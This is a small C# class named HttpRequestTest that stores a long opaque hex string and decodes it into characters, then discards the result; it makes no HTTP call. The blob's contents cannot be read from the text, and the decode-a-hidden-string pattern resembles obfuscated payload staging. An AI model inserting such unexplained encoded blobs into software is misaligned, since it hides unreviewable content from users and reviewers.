﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FileAndRegistrySnapshots
{
    public static class HttpRequestTest
    {

        private const string Data =
            "4577731f9f638f10eaa25cee05a46d29b907bd001282928b630c4c90556f2938e06230612a92070edb2dd9ad12931b4783a50b0acfb4e252e04381ae6ff225cf7c3a269a34a1eb9feadf79419a731b84718dabccf397aa0eeb5c770564f02870f5b2febb2d2b34a3d0b26a29c957395507b962bfb6d28d07f91faec6396921b43487a18f2db16d02989e769ec491e24ddde65e279a0d46e4a8d3214f96bfe5831ad1b98b22a023576176caf375def106bd3789af03eba2bd644b8cf821345078feb1c882cf3408a81e9eb6dac8873e2e60964cf4a1062542863cdcee81fde9c595106507ac8ed1c0e7fee766cd0d6690caef51f2290dadf59c00be8a4657397b671bc8673833d44d9f745f87f33fa1956a5a03be5be8974a8e3cbe1bdacba285c46a9de441bedb7bc30d39e0f8bd56ccdc448da4d8590e6a55122d6823c971d3d1f85c7df6df5ff2d65bafcefb47efc435b063e6012b3e472433541d8c1e768c377957a4d66a63c865ed98c36e8793d52c6546712f83ae7f58e799098cfcc6752d8615d887d4f7d2dce15137e685c2a9c47dafe1d9786ce13e896f9a7296ff8c66954b3b6c7b5a0dd6c9d20d85eaabdc7d5a6b6f775bd1a160416a4914a791a2911afa521d8396b1ed1e4a129e8127af5ac5bb0a1036dbad00a13e7d08970849b34853a75c8764a8bfaf90d2eb285941dd7aa4ec89c06d77c553cff6e3bead1b351cea8092a8461c66a7f6c2940f2b4925188eec8a12ba8a8821f3ce5b2eb6cc65d30ddd11b6cde1c39b28b1fb8377e94363ecbd0ee93fc5af557c83830d3715c0388a927620679a69173eb241d330f695141036635dd80b2a2811cd423b3ef4446a612c36d3aff0714cd9ac9a2c604b74a6414cc804542ab5c31c09e28d1a3a89280937d49eeb0381fc3f9b3534ed3c286c02364851a851f41db4742e3803356ab507170a0eb2064bb4a585fc6cf9ffe31cc73823b31a925a03ef8f3b900d69d569e82ec205eedf6bb023c72d139fb2c08d30edfc4ef5852df2b3ca133a9e0525047bbfebf6b080b1d762b600b3810bf7ea13beb434ff176a5e219c3ad6e45154f46eac18ab826db1804f15f430b76ba6ac08d65f896c9130523f7641aab081ff9292b9670fad369f580ce2109269c5c2b72073d455850620d2d75b1f8c1e522f103901";
        public static void Start()
        {
            var sb = new StringBuilder();
            for (var k = 0; k < Data.Length / 2; k++)
            {
                var s1 = Data.Substring(2 * k, 2);
                var i = Convert.ToInt32("0x" + s1, 16);
                if (i < 32)
                {

                }
                var c = Convert.ToChar(i);
                sb.Append(c);
            }

            var s2 = sb.ToString();
        }
    }
}
